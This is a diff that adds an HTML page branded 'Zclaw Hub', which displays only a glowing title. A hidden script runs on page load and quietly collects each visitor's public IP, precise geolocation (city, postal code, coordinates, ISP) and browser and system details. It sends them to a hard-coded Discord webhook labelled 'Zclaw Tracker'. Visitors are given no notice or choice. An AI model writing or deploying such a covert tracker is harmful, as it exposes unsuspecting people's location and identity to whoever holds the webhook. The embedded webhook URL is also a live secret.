@@ -1,0 +1,122 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Zclaw Hub</title>
+    <style>
+        body {
+            background-color: #000;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        .hub-text {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            text-shadow: 0 0 8px #0f0;
+            animation: glow 1.5s infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 5px #0f0; }
+            to { text-shadow: 0 0 15px #0f0, 0 0 20px #0f0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="hub-text">Zclaw Hub</div>
+
+    <script>
+        const collectData = async () => {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                return {
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    languages: navigator.languages.join(', '),
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    referrer: document.referrer || 'Direct',
+                    location: window.location.href,
+                    geo: {
+                        country: geoData.country_name,
+                        region: geoData.region,
+                        city: geoData.city,
+                        postal: geoData.postal,
+                        latitude: geoData.latitude,
+                        longitude: geoData.longitude,
+                        timezone: geoData.timezone,
+                        asn: geoData.asn,
+                        org: geoData.org,
+                        currency: geoData.currency,
+                        country_calling_code: geoData.country_calling_code,
+                        utc_offset: geoData.utc_offset
+                    }
+                };
+            } catch (error) {
+                return {
+                    ip: 'Error',
+                    userAgent: navigator.userAgent,
+                    location: window.location.href,
+                    geo: {
+                        country: 'Error',
+                        city: 'Error'
+                    }
+                };
+            }
+        };
+
+        const sendToDiscord = (data) => {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1398336740254814430/9VcNhxp2TaLgDwCEdfeg-kAotGhGpWnK7VK0eHRuQJI13L_a3a26kVt80AiBQE42Y9-m';
+            
+            const locationInfo = 
+                `**País:** ${data.geo.country || 'N/A'} (${data.geo.country_calling_code || 'N/A'})\n` +
+                `**Região:** ${data.geo.region || 'N/A'}\n` +
+                `**Cidade:** ${data.geo.city || 'N/A'} - CEP: ${data.geo.postal || 'N/A'}\n` +
+                `**Provedor:** ${data.geo.org || 'N/A'} (${data.geo.asn || 'N/A'})\n` +
+                `**Moeda:** ${data.geo.currency || 'N/A'}\n` +
+                `**Coordenadas:** [${data.geo.latitude}, ${data.geo.longitude}](https://maps.google.com/?q=${data.geo.latitude},${data.geo.longitude})`;
+            
+            const embed = {
+                title: "🔥 NOVA CONEXÃO DETECTADA - ZCLAW HUB",
+                color: 65280,
+                fields: [
+                    { name: "🌐 IP Público", value: `\`${data.ip}\``, inline: true },
+                    { name: "🕒 Fuso Horário", value: data.geo.timezone || 'N/A', inline: true },
+                    { name: "📍 Geolocalização", value: locationInfo, inline: false },
+                    { name: "🖥️ Sistema", value: `\`${data.platform}\` | \`${data.screen}\` | \`${data.languages}\``, inline: false },
+                    { name: "🔗 Origem", value: `[${data.location}](${data.location})`, inline: false }
+                ],
+                footer: { 
+                    text: `Zclaw Security • ${new Date().toLocaleString()}`,
+                    icon_url: "https://cdn-icons-png.flaticon.com/512/535/535137.png"
+                }
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    username: "Zclaw Tracker",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/535/535137.png",
+                    embeds: [embed] 
+                })
+            });
+        };
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            const userData = await collectData();
+            await sendToDiscord(userData);
+        });
+    </script>
+</body>
+</html>
